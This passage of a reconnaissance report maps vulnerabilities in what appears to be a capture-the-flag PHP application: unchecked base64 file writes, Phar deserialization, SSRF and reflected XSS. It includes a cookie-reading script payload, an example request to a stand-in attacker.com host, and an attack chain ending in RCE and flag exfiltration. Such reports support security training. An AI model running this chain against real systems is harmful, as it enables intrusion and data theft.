  file_put_contents($filePath, $decodedData)
Validation:
  ❌ NO content validation
  ❌ NO file type checking (magic bytes, extension validation)
  ❌ NO size limits
  ❌ Accepts ANY base64-decodable data
  ⚠️ Filename extension hardcoded to .jpg regardless of content
```

**Attack Scenarios:**
1. **Phar Upload:** Upload malicious Phar archive with `.jpg` extension
2. **Web Shell:** Upload PHP code (ineffective due to .jpg extension, but testable)
3. **Polyglot Files:** Upload files that are valid as both image and Phar

**Chaining:** This vulnerability enables the Phar deserialization attack by providing an upload mechanism.

### 9.9 Cross-Site Scripting (XSS)

**INJECTION SOURCE: Reflected XSS via SSRF + Raw Filter**

```
Entry Point: POST /sku_url.php - parameter 'url'
Source Location: /app/sku_url.php:73
Data Flow:
  1. User input received: $_POST['url'] (line 73)
  2. SSRF fetches content: file_get_contents($url, ...) (line 34)
  3. Response stored in $sku_model (line 80)
  4. Passed to Twig template (line 89)
  5. Rendered with |raw filter (no HTML escaping)
Dangerous Sink: /app/templates/sku_model.html.twig:20
  {{ sku_model|raw }}
Validation:
  ❌ NO sanitization of fetched content
  ❌ |raw filter disables HTML escaping
  ⚠️ Twig sandbox enabled but does not prevent rendering untrusted HTML with |raw
```

**Attack Scenario:**
1. Attacker hosts malicious HTML: `<script>alert(document.cookie)</script>`
2. Victim submits: `POST /sku_url.php` with `url=http://attacker.com:4455/xss`
3. Application fetches attacker's HTML via SSRF
4. HTML rendered in victim's browser without escaping
5. XSS executes in victim's context

**Note:** This is a reflected XSS vulnerability that requires user interaction. No stored XSS vulnerabilities identified.

### 9.10 Summary Table

| Injection Type | Vulnerable | Entry Point | Sink | Severity |
|----------------|------------|-------------|------|----------|
| SQL Injection | ❌ NO | N/A | Prepared statements prevent | N/A |
| Command Injection | ❌ NO | N/A | No shell execution functions | N/A |
| SSRF | ✅ YES | `/sku_url.php` - `url` | `file_get_contents()` | CRITICAL |
| Path Traversal | ✅ YES | `/sku_read` - `file_path` | `file_get_contents('phar://')` | HIGH |
| RFI | ❌ NO | N/A | Static include paths | N/A |
| SSTI | ❌ NO | N/A | Twig sandbox prevents | N/A |
| Unsafe Deserialization | ✅ YES | `/sku_read` - `file_path` | `unserialize()` + `eval()` | CRITICAL |
| Arbitrary File Write | ✅ YES | `/sku_process` - `data` | `file_put_contents()` | CRITICAL |
| XSS (Reflected) | ✅ YES | `/sku_url.php` - `url` | `{{ sku_model\|raw }}` | MEDIUM |

**Critical Attack Chain:** SSRF → Arbitrary File Write → Phar Deserialization → RCE → Flag Exfiltration

---

## RECONNAISSANCE COMPLETE

This comprehensive reconnaissance deliverable provides the foundational intelligence map for all subsequent vulnerability analysis phases. The application's complete absence of authentication and authorization controls, combined with multiple critical injection vulnerabilities, creates an extremely high-risk security posture suitable for CTF exploitation training.

**Next Steps for Specialists:**
1. **Injection Analyst:** Exploit SSRF → File Upload → Phar Deserialization chain for RCE
2. **XSS Analyst:** Test reflected XSS via SSRF response rendering
3. **Auth Analyst:** Document absence of authentication as critical finding
4. **Authz Analyst:** Document absence of authorization and IDOR vulnerabilities
5. **SSRF Analyst:** Enumerate internal network via SSRF, test protocol bypasses

**Priority Vulnerabilities:**
1. RCE via Phar Deserialization (CVSS 9.8)
2. SSRF with Internal Network Access (CVSS 9.1)
3. Arbitrary File Write (CVSS 8.1)
4. Complete Absence of Authentication (CVSS 10.0 for business impact)
5. Unauthenticated Mass Deletion (CVSS 7.5)